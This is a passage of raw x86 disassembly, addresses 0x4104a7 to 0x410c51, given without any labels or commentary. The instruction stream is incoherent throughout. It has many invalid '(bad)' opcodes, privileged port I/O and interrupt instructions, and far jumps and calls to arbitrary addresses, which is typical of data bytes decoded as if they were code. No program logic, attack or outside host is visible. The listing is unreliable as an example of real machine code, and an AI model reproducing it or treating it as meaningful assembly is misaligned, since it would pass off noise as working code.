  4104a7:	pop    eax
  4104a8:	cli    
  4104a9:	jae    0x41047c
  4104ab:	and    esi,DWORD PTR [ebp+edx*1-0x73]
  4104af:	scas   al,BYTE PTR es:[edi]
  4104b0:	mov    BYTE PTR [ebx+edx*8-0xac6e323],ch
  4104b7:	stc    
  4104b8:	js     0x41050f
  4104ba:	pop    ds
  4104bb:	adc    al,0x32
  4104bd:	mov    eax,0xd0b7c23f
  4104c2:	mov    dl,0x67
  4104c4:	and    DWORD PTR [edi+0x7a],edi
  4104c7:	dec    edi
  4104c8:	lods   al,BYTE PTR ds:[esi]
  4104c9:	in     al,dx
  4104ca:	lock and ah,BYTE PTR [ebx]
  4104cd:	mov    ds:0x8107f283,eax
  4104d2:	outs   dx,DWORD PTR ds:[esi]
  4104d3:	pop    esp
  4104d4:	xor    al,0x86
  4104d6:	mul    DWORD PTR [ebx]
  4104d8:	test   esi,ecx
  4104da:	and    DWORD PTR [eax-0x2746e5d2],ebx
  4104e0:	and    BYTE PTR [ecx-0x9],0x69
  4104e4:	retf   0xb5e5
  4104e7:	adc    al,0x5b
  4104e9:	pop    ecx
  4104ea:	sti    
  4104eb:	stc    
  4104ec:	lock sbb al,0x5f
  4104ef:	out    dx,eax
  4104f0:	cld    
  4104f1:	mov    ebx,0x1e6ebba7
  4104f6:	pop    esi
  4104f7:	int    0xd3
  4104f9:	sub    bh,0x44
  4104fc:	xchg   edx,eax
  4104fd:	es and esp,ebp
  410500:	pop    edx
  410501:	add    eax,0xb04a002d
  410506:	mov    es:0x42be34da,eax
  41050c:	add    DWORD PTR [ebx],ebx
  41050e:	add    eax,0x7ea6ba6
  410513:	mov    ecx,0x54449d2d
  410518:	jl     0x4104cf
  41051a:	leave  
  41051b:	sahf   
  41051c:	jo     0x41058e
  41051e:	mov    esi,0xb477f399
  410523:	cmc    
  410524:	bound  ebp,QWORD PTR [eax*8+0x4b002511]
  41052b:	cmp    edi,DWORD PTR [ebx+0x416e0c44]
  410531:	scas   al,BYTE PTR es:[edi]
  410532:	jo     0x4104db
  410534:	push   esp
  410535:	out    dx,eax
  410536:	or     BYTE PTR [esi-0x7013c845],cl
  41053c:	scas   eax,DWORD PTR es:[edi]
  41053d:	and    DWORD PTR [edx+edi*8],ecx
  410540:	lods   eax,DWORD PTR ds:[esi]
  410541:	mov    ch,0x63
  410543:	stc    
  410544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410545:	sub    cl,BYTE PTR [ebx*2-0x6be4a348]
  41054c:	(bad)  
  41054d:	jo     0x4105c0
  41054f:	xor    eax,0xaef9c9cd
  410554:	xlat   BYTE PTR ds:[ebx]
  410555:	outs   dx,DWORD PTR ds:[esi]
  410556:	add    al,0xa9
  410558:	imul   edi,DWORD PTR [ebx],0xffffffd1
  41055b:	cs int3 
  41055d:	dec    ebx
  41055e:	clc    
  41055f:	daa    
  410560:	popf   
  410561:	retf   
  410562:	adc    eax,0xc013167f
  410567:	leave  
  410568:	add    eax,0xdcd584d3
  41056d:	mov    edi,0x46c7f799
  410572:	fnstenv [esi]
  410574:	pop    eax
  410575:	add    al,0x1d
  410577:	sub    ch,BYTE PTR [esi+0x70]
  41057a:	push   es
  41057b:	int    0x6d
  41057d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41057e:	add    ah,BYTE PTR [ebp+0x6191be00]
  410584:	push   ecx
  410585:	sub    dh,al
  410587:	cmp    eax,0xaa6cd8ff
  41058c:	ficomp WORD PTR [eax+ecx*4+0x1f]
  410590:	dec    edx
  410591:	lods   eax,DWORD PTR ds:[esi]
  410592:	test   BYTE PTR [esp+ebp*8],bh
  410595:	imul   ebp,edx,0xf5202e86
  41059b:	ins    DWORD PTR es:[edi],dx
  41059c:	lea    edi,[ebx+ecx*8]
  41059f:	xor    edx,edx
  4105a1:	or     al,0x98
  4105a3:	pop    eax
  4105a4:	loop   0x410603
  4105a6:	data16 int 0x90
  4105a9:	data16 add al,0x4
  4105ac:	ins    DWORD PTR es:[edi],dx
  4105ad:	jb     0x4105e2
  4105af:	mov    DWORD PTR [eax],edx
  4105b1:	dec    esi
  4105b2:	fist   WORD PTR [edx]
  4105b4:	mov    esp,0x44047683
  4105b9:	or     edi,DWORD PTR [ebx-0x28]
  4105bc:	mov    es,WORD PTR [edx]
  4105be:	mov    ds:0xe8c88fb7,eax
  4105c3:	push   cs
  4105c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105c5:	ret    
  4105c6:	cmc    
  4105c7:	mov    esp,0xf24472ee
  4105cc:	add    al,bl
  4105ce:	lahf   
  4105cf:	mov    gs,WORD PTR [eax-0x5aa51747]
  4105d5:	retf   0x5800
  4105d8:	and    ah,ah
  4105da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105db:	mov    eax,0x8f4d6d97
  4105e0:	inc    eax
  4105e1:	ins    BYTE PTR es:[edi],dx
  4105e2:	xchg   DWORD PTR [edx],esi
  4105e4:	(bad)  
  4105e5:	mov    ebx,0xebe9e33f
  4105ea:	inc    esi
  4105eb:	in     al,0x1e
  4105ed:	imul   edx,DWORD PTR [esi+edi*4],0x7e
  4105f1:	adc    eax,0x5cdc1d01
  4105f6:	pop    ebp
  4105f7:	mov    bl,0x2a
  4105f9:	dec    edx
  4105fa:	pop    edi
  4105fb:	add    cl,BYTE PTR [edx]
  4105fd:	(bad)  
  4105ff:	scas   eax,DWORD PTR es:[edi]
  410600:	stos   DWORD PTR es:[edi],eax
  410601:	punpcklbw mm4,mm7
  410604:	je     0x4105d2
  410606:	jecxz  0x41066e
  410608:	xor    eax,0xc564f555
  41060d:	jmp    FWORD PTR [esi]
  41060f:	loop   0x41067e
  410611:	shl    BYTE PTR ds:0xa18a3c47,cl
  410617:	xor    esi,DWORD PTR [eax+0x27]
  41061a:	push   esi
  41061b:	mov    eax,0xd4e5170b
  410620:	cdq    
  410621:	pop    ss
  410622:	fsub   st(6),st
  410624:	fcmove st,st(4)
  410626:	pop    es
  410627:	push   es
  410628:	(bad)
  41062b:	pop    ebp
  41062c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41062e:	xor    dl,dh
  410630:	into   
  410631:	xchg   ebp,eax
  410632:	iret   
  410633:	scas   al,BYTE PTR es:[edi]
  410634:	retf   0x66cc
  410637:	jge    0x41068d
  410639:	lea    edi,[edi+0x203078e]
  41063f:	mov    bl,0x3f
  410641:	mov    BYTE PTR [eax],bh
  410643:	ret    0xac48
  410646:	int    0xd7
  410648:	shl    BYTE PTR [esi],1
  41064a:	adc    DWORD PTR ds:0x85af0228,esp
  410650:	push   edi
  410651:	xchg   ecx,eax
  410652:	xchg   cl,dl
  410654:	int3   
  410655:	iretw  
  410657:	aaa    
  410658:	xor    ecx,DWORD PTR [ebx]
  41065a:	cmp    dl,BYTE PTR [ecx-0x162e05c8]
  410660:	pop    es
  410661:	lds    esp,FWORD PTR ds:0xd795cf10
  410667:	xchg   ebp,eax
  410668:	fs out dx,eax
  41066a:	out    dx,eax
  41066b:	pop    eax
  41066c:	jg     0x410631
  41066e:	hlt    
  41066f:	sub    DWORD PTR [ebx+0x47],ebx
  410672:	mov    ds:0x766d9518,eax
  410677:	(bad)  
  410678:	jb     0x4106ba
  41067a:	hlt    
  41067b:	pop    esp
  41067c:	cdq    
  41067d:	xchg   ebx,eax
  41067e:	jns    0x410698
  410680:	jmp    0xffd2:0x691a64fa
  410687:	shl    edx,1
  410689:	push   ds
  41068a:	add    al,0xeb
  41068c:	jb     0x410629
  41068e:	int3   
  41068f:	mov    bh,0xf7
  410691:	das    
  410692:	sbb    eax,0xe0f5a925
  410697:	js     0x41064c
  410699:	mov    eax,ds:0x6018f0f2
  41069e:	inc    ebx
  41069f:	sub    dh,al
  4106a1:	add    dl,BYTE PTR [edx+eiz*1+0x43fda637]
  4106a8:	xor    eax,0x18bbe25f
  4106ad:	lock aas 
  4106af:	shl    DWORD PTR ds:0x75862e9e,1
  4106b5:	jecxz  0x410715
  4106b7:	push   ebp
  4106b8:	mov    ebp,0xf9a7761
  4106bd:	xchg   esp,eax
  4106be:	jmp    0x410698
  4106c0:	xchg   edx,eax
  4106c1:	pusha  
  4106c2:	cdq    
  4106c3:	cmp    al,0xa7
  4106c5:	sub    eax,0x34c1f9f4
  4106ca:	or     ecx,DWORD PTR es:[eax]
  4106cd:	xchg   esi,eax
  4106ce:	jle    0x410657
  4106d0:	call   0x23277141
  4106d5:	shr    DWORD PTR [ebx+0x17e70814],cl
  4106db:	cli    
  4106dc:	sbb    DWORD PTR [eax],esp
  4106de:	adc    bl,BYTE PTR [ebp+0x25893236]
  4106e4:	or     DWORD PTR [ebx+0x446b9468],eax
  4106ea:	push   es
  4106eb:	pop    edx
  4106ec:	outs   dx,DWORD PTR ds:[esi]
  4106ed:	xchg   ebx,eax
  4106ee:	add    bl,BYTE PTR [edi-0xb]
  4106f1:	pop    DWORD PTR [ebp+0x6]
  4106f4:	jo     0x4106a9
  4106f6:	sbb    cl,ah
  4106f8:	(bad)  [ecx]
  4106fa:	inc    eax
  4106fb:	add    dl,BYTE PTR [ecx+0x7e]
  4106fe:	(bad)  
  4106ff:	jo     0x410721
  410701:	loope  0x410702
  410703:	jno    0x410713
  410705:	popf   
  410706:	cmp    dh,cl
  410708:	jo     0x41070e
  41070a:	pcmpgtb mm0,QWORD PTR [esp+edx*1]
  41070e:	sbb    DWORD PTR [ecx],ebx
  410710:	xchg   edi,eax
  410711:	pop    ebx
  410712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410713:	dec    ecx
  410714:	xchg   esi,eax
  410715:	test   eax,0x3500bf3b
  41071a:	sub    eax,0x23ff6bbb
  41071f:	cwde   
  410720:	rcl    DWORD PTR [ebp-0x264900f6],1
  410726:	cmp    BYTE PTR [esi],0x5d
  410729:	inc    DWORD PTR [edx+0x3a922fa5]
  41072f:	inc    edx
  410730:	ds pop eax
  410732:	xlat   BYTE PTR ds:[ebx]
  410733:	push   ss
  410734:	sub    eax,0x99a5baa6
  410739:	lds    ecx,FWORD PTR [ecx+0x74322b71]
  41073f:	ins    DWORD PTR es:[edi],dx
  410740:	pusha  
  410741:	sub    BYTE PTR [edx+0x42],al
  410744:	dec    ecx
  410745:	and    DWORD PTR [edx-0x27fb5bd5],ecx
  41074b:	jl     0x41079d
  41074d:	int    0xb5
  41074f:	stos   BYTE PTR es:[edi],al
  410750:	cdq    
  410751:	mov    ah,0x2a
  410753:	xor    ebp,DWORD PTR [ecx]
  410755:	mov    esp,0x7954b7e2
  41075a:	pop    es
  41075b:	fs xor ebp,eax
  41075e:	(bad)  
  41075f:	cmc    
  410760:	lock into 
  410762:	add    DWORD PTR [eax],edi
  410764:	mov    eax,0x504b05f4
  410769:	sti    
  41076a:	(bad)  
  41076b:	sti    
  41076c:	fidiv  DWORD PTR [eax-0x40]
  41076f:	aaa    
  410770:	retf   0x3eec
  410773:	mov    bl,0xf8
  410775:	fcmovu st,st(7)
  410777:	dec    ebp
  410778:	in     al,dx
  410779:	sbb    bl,0xc
  41077c:	daa    
  41077d:	ins    DWORD PTR es:[edi],dx
  41077e:	jl     0x4107ef
  410780:	ret    
  410781:	mov    eax,ebp
  410783:	pop    eax
  410784:	sub    eax,0x37a1c88a
  410789:	jmp    0x41072d
  41078b:	and    ah,BYTE PTR [ebx+0x18d5c161]
  410791:	mov    ds:0xe5752653,al
  410796:	shl    DWORD PTR [ebx],1
  410798:	shl    DWORD PTR [ebx-0x5fb51f68],0x69
  41079f:	xor    BYTE PTR [eax+0x5f],dh
  4107a2:	mov    dl,BYTE PTR [ecx-0x5e587660]
  4107a8:	add    DWORD PTR [ebp+0x3fa0fea8],esp
  4107ae:	sbb    al,0x2a
  4107b0:	pop    ss
  4107b1:	lds    edx,FWORD PTR [eax]
  4107b3:	xor    bl,dh
  4107b5:	ror    BYTE PTR [eax],1
  4107b7:	and    DWORD PTR [ebp+0x33],ebp
  4107ba:	cmp    BYTE PTR [esi],cl
  4107bc:	xchg   edi,eax
  4107bd:	aad    0x76
  4107bf:	jge    0x410831
  4107c1:	nop
  4107c2:	inc    ebx
  4107c3:	adc    BYTE PTR [ecx-0x9],dl
  4107c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107c7:	xor    edi,DWORD PTR [ecx-0x60]
  4107ca:	in     eax,0x8
  4107cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107cd:	xor    DWORD PTR [edx+0x38f37519],esi
  4107d3:	mov    ds:0x61ff5417,eax
  4107d8:	test   BYTE PTR [ecx+0x1f],bl
  4107db:	inc    eax
  4107dc:	jbe    0x4107a8
  4107de:	jb     0x4107f6
  4107e0:	das    
  4107e1:	xchg   DWORD PTR [edx+0x74],ebx
  4107e4:	nop
  4107e5:	or     edx,ebp
  4107e7:	(bad)  
  4107e8:	(bad)  
  4107e9:	mov    ecx,0xc3e74ce
  4107ee:	lahf   
  4107ef:	out    0x3c,eax
  4107f1:	jns    0x41085f
  4107f3:	add    al,0x7
  4107f5:	fdivrp st(2),st
  4107f7:	loop   0x4107da
  4107f9:	add    ah,cl
  4107fb:	xchg   esi,eax
  4107fc:	fstp   st(3)
  4107fe:	cmc    
  4107ff:	add    BYTE PTR [eax-0x7b],bl
  410802:	fisubr DWORD PTR [ecx+0x4d]
  410805:	mov    DWORD PTR [esi+0x5fa7b23b],0x64954b29
  41080f:	sahf   
  410810:	sub    al,0xfc
  410812:	fistp  WORD PTR [eax-0x7f]
  410815:	push   ss
  410816:	test   al,0x0
  410818:	mov    bl,0xc4
  41081a:	rcl    DWORD PTR [ebx+0x30],0xde
  41081e:	xlat   BYTE PTR ds:[ebx]
  41081f:	bound  edx,QWORD PTR [edi-0x5af9f76b]
  410825:	icebp  
  410826:	outs   dx,BYTE PTR ds:[esi]
  410827:	jns    0x410818
  410829:	jle    0x410829
  41082b:	scas   al,BYTE PTR es:[edi]
  41082c:	out    0xd4,eax
  41082e:	outs   dx,BYTE PTR ds:[esi]
  41082f:	jnp    0x410843
  410831:	inc    edx
  410832:	out    0x23,al
  410834:	adc    al,0x2e
  410836:	fisttp QWORD PTR [ecx]
  410838:	or     bh,BYTE PTR [edi-0x719c4f57]
  41083e:	jg     0x41080e
  410840:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410841:	mov    ecx,0x4a6fe9c8
  410846:	add    edx,DWORD PTR [edx]
  410848:	push   eax
  410849:	mov    al,ds:0xbaecfdb7
  41084e:	cmp    dh,dh
  410850:	xor    DWORD PTR [eax-0x7e],esi
  410853:	aam    0xac
  410855:	jne    0x410819
  410857:	arpl   WORD PTR [edi-0x2d7623de],cx
  41085d:	cmp    BYTE PTR [edi-0x6c],cl
  410860:	nop
  410861:	dec    esp
  410862:	adc    edi,DWORD PTR [ebx]
  410864:	jmp    0x427b:0xa63e900b
  41086b:	ins    BYTE PTR es:[edi],dx
  41086c:	pushf  
  41086d:	and    esi,esi
  41086f:	mov    ebp,0x72947345
  410874:	out    dx,al
  410875:	and    eax,0xeba7057b
  41087a:	adc    BYTE PTR [edx-0x30ee275e],dl
  410880:	mov    ds:0xbd4d5ea,al
  410885:	mov    edx,0xa158958a
  41088a:	mov    DWORD PTR [edi-0x16d111ff],esp
  410890:	repz scas eax,DWORD PTR es:[edi]
  410892:	pop    ebp
  410893:	aas    
  410894:	or     eax,0x76b82d0
  410899:	and    cl,BYTE PTR [edi+0x56462e46]
  41089f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108a0:	out    0x5c,al
  4108a2:	test   BYTE PTR [ecx-0x14],ah
  4108a5:	xor    al,0x1d
  4108a7:	fisttp QWORD PTR [eax-0x75]
  4108aa:	mov    edx,0xd00665a4
  4108af:	jbe    0x410890
  4108b1:	jae    0x4108b5
  4108b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b4:	mov    ebx,0x44cda321
  4108b9:	das    
  4108ba:	dec    ebx
  4108bb:	cmp    bl,cl
  4108bd:	aam    0x72
  4108bf:	ficom  WORD PTR [eax]
  4108c1:	outs   dx,BYTE PTR ds:[esi]
  4108c2:	dec    edx
  4108c3:	cmp    edi,0x4d
  4108c6:	nop
  4108c7:	das    
  4108c8:	data16 stc 
  4108ca:	or     ebp,DWORD PTR [edi+esi*2-0x44]
  4108ce:	mov    esp,0x76356c0e
  4108d3:	lods   eax,DWORD PTR ds:[esi]
  4108d4:	adc    ch,BYTE PTR [edx-0x1c]
  4108d7:	or     al,0xe4
  4108d9:	dec    dx
  4108db:	stos   DWORD PTR es:[edi],eax
  4108dc:	fstp   TBYTE PTR [esi]
  4108de:	sahf   
  4108df:	or     esi,DWORD PTR [esi]
  4108e1:	enter  0x3cea,0xc4
  4108e5:	add    edi,DWORD PTR [esi-0x57]
  4108e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108e9:	jecxz  0x4108d9
  4108eb:	push   eax
  4108ec:	mov    ebx,0x2b5ba5b0
  4108f1:	xchg   esp,eax
  4108f2:	cli    
  4108f3:	adc    dl,BYTE PTR [ebp+0x61]
  4108f6:	pop    ebp
  4108f7:	mov    ds,WORD PTR [esi+0x372f6c8f]
  4108fd:	loope  0x4108bc
  4108ff:	shl    esi,1
  410901:	adc    BYTE PTR [esi+edx*1],bh
  410904:	or     dh,ah
  410906:	sar    DWORD PTR [esi-0x366b582f],0x78
  41090d:	and    al,BYTE PTR [esi]
  41090f:	xor    eax,0x3f39c7ed
  410914:	jnp    0x41090e
  410916:	sbb    ebx,DWORD PTR ds:0xc7609684
  41091c:	nop
  41091d:	xor    bh,dl
  41091f:	scas   al,BYTE PTR es:[edi]
  410920:	(bad)  
  410921:	retf   0x2c23
  410924:	adc    al,0xcc
  410926:	psrlq  mm0,mm3
  410929:	mov    edx,0x2b8304a7
  41092e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41092f:	ja     0x410916
  410931:	rol    edx,0x8d
  410934:	mov    al,0x96
  410936:	div    BYTE PTR [ebx]
  410938:	jl     0x410962
  41093a:	xchg   cl,dl
  41093c:	adc    al,0x25
  41093e:	scas   al,BYTE PTR es:[edi]
  41093f:	into   
  410940:	xor    al,0x31
  410942:	(bad)  
  410944:	push   0x40fcf093
  410949:	mov    esp,es
  41094b:	add    DWORD PTR [ebx+0x5a],edx
  41094e:	cmp    DWORD PTR [ebx],ecx
  410950:	jmp    0x8a0d4c34
  410955:	ins    DWORD PTR es:[edi],dx
  410956:	mov    dl,BYTE PTR [esi+0x52eff8e]
  41095c:	stc    
  41095d:	jge    0x41091a
  41095f:	dec    esp
  410960:	pusha  
  410961:	call   FWORD PTR [ecx]
  410963:	mov    edi,0x76b9a8d
  410968:	adc    eax,0xe847e82f
  41096d:	loope  0x4109c9
  41096f:	mov    bl,0xaa
  410971:	cdq    
  410972:	icebp  
  410973:	inc    edx
  410974:	pop    edi
  410975:	xchg   esp,eax
  410976:	and    eax,esi
  410978:	cmp    cl,0x96
  41097b:	sub    eax,0x1ae9e475
  410980:	mov    al,ds:0x4ea6d50e
  410985:	sbb    al,0xad
  410987:	mov    cl,0xd7
  410989:	inc    esi
  41098a:	mov    eax,0xd037f2dd
  41098f:	cmp    DWORD PTR [ebp*4-0x6ae78786],esi
  410996:	and    DWORD PTR [esi-0x46],edi
  410999:	jmp    0x410986
  41099b:	add    dh,BYTE PTR [eax+ebx*1]
  41099e:	call   0x1b516679
  4109a3:	(bad)  [esi+0x3a]
  4109a6:	pop    ebp
  4109a7:	neg    BYTE PTR [eax]
  4109a9:	ds retf 
  4109ab:	xchg   ebx,eax
  4109ac:	repnz mov edx,0x175056b5
  4109b2:	sbb    ecx,DWORD PTR [eax+0x244d3c27]
  4109b8:	jns    0x410980
  4109ba:	mov    DWORD PTR [eax+0x4664e0bd],ecx
  4109c0:	popf   
  4109c1:	fidivr WORD PTR [ecx-0x3e]
  4109c4:	outs   dx,DWORD PTR ds:[esi]
  4109c5:	arpl   WORD PTR [esi-0x2],di
  4109c8:	sub    eax,0xcd97f2a4
  4109cd:	mov    ch,0xa3
  4109cf:	inc    edx
  4109d0:	dec    ebp
  4109d1:	add    BYTE PTR [eax+ebp*8-0x3d690d57],ch
  4109d8:	cmp    al,0xec
  4109da:	fcomi  st,st(7)
  4109dc:	stc    
  4109dd:	gs jno 0x4109da
  4109e0:	sti    
  4109e1:	fcom   QWORD PTR [ebp+0x4819a539]
  4109e7:	jge    0x410978
  4109e9:	in     eax,0xf2
  4109eb:	pop    ecx
  4109ec:	call   0xcca3:0x8c9fb574
  4109f3:	cld    
  4109f4:	mov    cl,0xba
  4109f6:	(bad)  
  4109f7:	fmulp  st(1),st
  4109f9:	mov    esi,0x3ea86e2c
  4109fe:	ss dec esp
  410a00:	or     eax,0xa38f9025
  410a05:	lods   eax,DWORD PTR ds:[esi]
  410a06:	jecxz  0x4109f7
  410a08:	jge    0x4109d5
  410a0a:	arpl   si,dx
  410a0c:	mov    bl,0xcd
  410a0e:	sub    DWORD PTR [eax+0x6],esi
  410a11:	stc    
  410a12:	adc    eax,DWORD PTR [ebp-0x28]
  410a15:	push   esi
  410a16:	push   esi
  410a17:	pop    ds
  410a18:	inc    esi
  410a19:	aam    0x80
  410a1b:	rol    DWORD PTR [eax+0x7d],0x9
  410a1f:	in     al,0x28
  410a21:	add    DWORD PTR [eax+0x7ff9d441],ebp
  410a27:	repz loope 0x410a39
  410a2a:	lods   al,BYTE PTR ds:[esi]
  410a2b:	dec    ebp
  410a2c:	popa   
  410a2d:	mov    WORD PTR [esp+edx*4],cs
  410a30:	cmc    
  410a31:	mov    eax,ds:0xd4b2abf8
  410a36:	pushf  
  410a37:	mov    cs,WORD PTR [ebp+0x33]
  410a3a:	dec    ebx
  410a3b:	or     DWORD PTR [ebx-0x29],ecx
  410a3e:	sbb    DWORD PTR [ebx+eiz*4],edi
  410a41:	dec    ebp
  410a42:	lods   al,BYTE PTR ds:[esi]
  410a43:	call   0x87ea3c29
  410a48:	xchg   edi,eax
  410a49:	push   eax
  410a4a:	stos   BYTE PTR es:[edi],al
  410a4b:	jnp    0x410a92
  410a4d:	out    0x7a,al
  410a4f:	xchg   ebx,eax
  410a50:	fisttp QWORD PTR ds:0xdace01c7
  410a56:	leave  
  410a57:	imul   eax,DWORD PTR [esi],0x6614c843
  410a5d:	es jnp 0x410a07
  410a60:	and    dl,BYTE PTR [edi+0x439967ff]
  410a66:	inc    eax
  410a67:	mov    ebp,0x18a30e8d
  410a6c:	jge    0x410a89
  410a6e:	jb     0x410aa0
  410a70:	or     dl,ah
  410a72:	sbb    DWORD PTR [edi-0x3a25fc34],esp
  410a78:	mov    DWORD PTR [ebp+0x1aa7e394],edi
  410a7e:	sub    al,0x91
  410a80:	cmp    al,0xf4
  410a82:	mov    edi,0xaa611de2
  410a87:	xchg   esp,eax
  410a88:	dec    ebx
  410a89:	add    eax,0x6c571495
  410a8e:	aam    0x45
  410a90:	push   esp
  410a91:	cmc    
  410a92:	jge    0x410af3
  410a94:	cmc    
  410a95:	(bad)  
  410a97:	ja     0x410ad1
  410a99:	mov    BYTE PTR [ebp+0x73115ad2],bl
  410a9f:	dec    esp
  410aa0:	mov    edi,0x1b598184
  410aa5:	shr    BYTE PTR [edx],cl
  410aa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410aa8:	retf   
  410aa9:	ret    0x3fb1
  410aac:	pop    ebx
  410aad:	or     ecx,DWORD PTR [eax+eiz*4]
  410ab0:	imul   ebp,DWORD PTR [esi],0x44
  410ab3:	inc    ebx
  410ab4:	mov    ebp,0x60705bd7
  410ab9:	push   esi
  410aba:	push   edx
  410abb:	dec    edi
  410abc:	fdivr  DWORD PTR [ecx]
  410abe:	mov    esp,0x1ebacb75
  410ac3:	adc    al,0x53
  410ac5:	jmp    0x585ce46c
  410aca:	test   eax,0x6dfb016b
  410acf:	stos   BYTE PTR es:[edi],al
  410ad0:	dec    eax
  410ad1:	mov    dl,0xbc
  410ad3:	xchg   esi,eax
  410ad4:	dec    edx
  410ad5:	xchg   ebp,eax
  410ad6:	pusha  
  410ad7:	ins    DWORD PTR es:[edi],dx
  410ad8:	or     DWORD PTR [ecx],ebp
  410ada:	inc    ebp
  410adb:	outs   dx,DWORD PTR ds:[esi]
  410adc:	xchg   esi,eax
  410add:	adc    al,0xf6
  410adf:	or     eax,0xd1423afe
  410ae4:	test   eax,0x4b9a5e84
  410ae9:	cwde   
  410aea:	jns    0x410b0c
  410aec:	or     DWORD PTR [edx+ebx*1-0x4c662096],ebx
  410af3:	push   ds
  410af4:	xchg   DWORD PTR [edx-0x1c6178a1],esp
  410afa:	mov    ecx,0xd3650b4f
  410aff:	push   ebp
  410b00:	mov    al,ds:0x51c47d35
  410b05:	pop    ecx
  410b06:	cmp    DWORD PTR [edx-0x2f23878a],edi
  410b0c:	pop    ebp
  410b0d:	out    dx,al
  410b0e:	std    
  410b0f:	add    al,0x53
  410b11:	inc    edi
  410b12:	dec    ebp
  410b13:	repz fiadd DWORD PTR [esi+0x4d]
  410b17:	popf   
  410b18:	xor    dl,BYTE PTR [edi]
  410b1a:	sub    BYTE PTR [edx-0x7752379e],ah
  410b20:	xchg   ecx,eax
  410b21:	repnz push esp
  410b23:	jae    0x410aae
  410b25:	dec    eax
  410b26:	lods   eax,DWORD PTR ds:[esi]
  410b27:	out    dx,al
  410b28:	sub    cl,ch
  410b2a:	mov    DWORD PTR [edi-0x18],ebp
  410b2d:	hlt    
  410b2e:	pop    esp
  410b2f:	aaa    
  410b30:	mov    eax,ds:0xffb4a55c
  410b35:	mov    dh,0xd8
  410b37:	and    eax,0x1faf9e39
  410b3c:	mov    ds:0xdc1c0e84,eax
  410b41:	sahf   
  410b42:	out    0xb5,eax
  410b44:	popa   
  410b45:	lods   eax,DWORD PTR ds:[esi]
  410b46:	das    
  410b47:	bound  ecx,QWORD PTR [edx-0x2aaf10b9]
  410b4d:	ja     0x410b33
  410b4f:	pop    esi
  410b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b52:	dec    ecx
  410b53:	and    DWORD PTR [eax+0x2fd81f3e],esi
  410b59:	rcr    DWORD PTR [edx+0x7d],0x7c
  410b5d:	adc    al,0x63
  410b5f:	pop    ecx
  410b60:	cwde   
  410b61:	icebp  
  410b62:	out    dx,eax
  410b63:	mov    ah,ch
  410b65:	push   ds
  410b66:	sar    DWORD PTR es:[edx+0x28b096f8],1
  410b6d:	mov    eax,0x466f5dbd
  410b72:	sbb    BYTE PTR [edx-0x260ed293],ch
  410b78:	mov    DWORD PTR [ecx],ecx
  410b7a:	lods   eax,DWORD PTR ds:[esi]
  410b7b:	add    eax,edx
  410b7d:	xor    dh,BYTE PTR [edx+ebx*4]
  410b80:	retf   0xabef
  410b83:	das    
  410b84:	test   eax,0x89484859
  410b89:	in     al,0xa6
  410b8b:	repz pop esi
  410b8d:	scas   eax,DWORD PTR es:[edi]
  410b8e:	ror    DWORD PTR [esi+ebp*8+0x724e6847],0xc6
  410b96:	and    eax,0x1b6e0190
  410b9b:	call   0xe0e4:0x7400c797
  410ba2:	lods   al,BYTE PTR ds:[esi]
  410ba3:	imul   ecx,DWORD PTR ds:0xb55c3aaa,0xffffffe7
  410baa:	fst    QWORD PTR [eax+0x745c49ef]
  410bb0:	inc    esi
  410bb1:	pop    esi
  410bb2:	jo     0x410c1e
  410bb4:	ret    
  410bb5:	arpl   ax,si
  410bb7:	(bad)  [ebp-0x32cf718d]
  410bbd:	xchg   ebp,eax
  410bbe:	imul   esi,edx,0xffffff90
  410bc1:	push   esp
  410bc2:	mov    edi,DWORD PTR [esi-0x22]
  410bc5:	xchg   edi,eax
  410bc6:	add    al,0x6a
  410bc8:	xor    esp,DWORD PTR ds:0x56ba2bd9
  410bce:	jmp    0x2a7e:0xb1c7f3b2
  410bd5:	or     eax,0x8b416177
  410bda:	pushf  
  410bdb:	push   cs
  410bdc:	inc    eax
  410bdd:	xchg   ebx,eax
  410bde:	cmp    eax,0x9136465
  410be3:	mov    ss,WORD PTR [edx]
  410be5:	jl     0x410c40
  410be7:	mov    edx,0x95f72e90
  410bec:	add    ax,0x9795
  410bf0:	loopne 0x410c2f
  410bf2:	pop    ds
  410bf3:	ss stos DWORD PTR es:[edi],eax
  410bf5:	xchg   edi,eax
  410bf6:	ror    DWORD PTR [esp+ecx*8],1
  410bf9:	mov    ah,BYTE PTR [esi+0x30e3bc00]
  410bff:	shr    BYTE PTR [edi],0x77
  410c02:	mov    ecx,0x208c5b80
  410c07:	adc    ch,BYTE PTR [ebx+0x26]
  410c0a:	mov    eax,ds:0xd2bbd747
  410c0f:	adc    esi,esi
  410c11:	mov    edi,0xaa84b2c7
  410c16:	mov    esi,0xfe1cb433
  410c1b:	sub    al,0xfc
  410c1d:	add    ebx,ebp
  410c1f:	enter  0xca81,0x3c
  410c23:	sbb    BYTE PTR [edi-0x48],bh
  410c26:	call   FWORD PTR [ebx+edi*8+0x70625ccc]
  410c2d:	inc    edx
  410c2e:	jl     0x410bcb
  410c30:	repnz pop ebx
  410c32:	repz dec ebp
  410c34:	adc    DWORD PTR [edx],esi
  410c36:	sbb    dh,BYTE PTR [edx]
  410c38:	xchg   ecx,eax
  410c39:	add    al,0xcf
  410c3b:	sahf   
  410c3c:	call   0xb472944f
  410c41:	cdq    
  410c42:	dec    ecx
  410c43:	dec    eax
  410c44:	push   cs
  410c45:	cmp    DWORD PTR [edi],0xffffffa1
  410c48:	rcl    BYTE PTR [ebx-0x6d],cl
  410c4b:	repz popf 
  410c4d:	arpl   sp,sp
  410c4f:	fimul  WORD PTR [esi]
  410c51:	in     eax,0xa
